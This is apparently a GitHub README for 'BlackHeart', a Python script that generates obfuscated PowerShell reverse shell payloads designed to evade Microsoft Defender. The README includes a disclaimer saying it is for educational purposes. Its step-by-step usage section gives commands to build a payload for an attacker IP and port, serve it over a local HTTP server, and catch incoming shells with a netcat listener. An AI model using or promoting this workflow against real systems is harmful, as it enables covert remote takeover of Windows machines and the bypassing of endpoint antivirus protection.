# BlackHeart
<img src="https://img.shields.io/badge/-Linux-black?style=for-the-badge&logo=Linux&logoColor=white"> <img src="https://img.shields.io/badge/-Python-black?style=for-the-badge&logo=python&logoColor=white"><br>

BlackHeart is a simple python script to generate powershell scripts that demonstrate reverse shell gaining without Microsoft Defender restrictions. (FOR EDUCATIONAL PURPOSES!!)

# Updates
<b>04/09/2022</b>

- [X] Added basic obfuscation to reverse shell file.
- [X] Bug fixes.

# Setup
You can use simply the following command<br>
```bash
pip3 install -r requirements.txt
```

# Usage
- First of all you have to generate a template for your shell.
```bash
python3 blackheart.py --lhost YOUR_IP --lport YOUR_PORT
```

- Then you have to open a simple http server to serve your template.
```bash
python3 -m http.server
```

- And you need to open a listener port to listen incoming connections.
```bash
nc -lvp 4545
```

# PoC
https://user-images.githubusercontent.com/42123683/188307621-dba04ee0-5cb3-4c72-94dd-d1ee95661a50.mp4
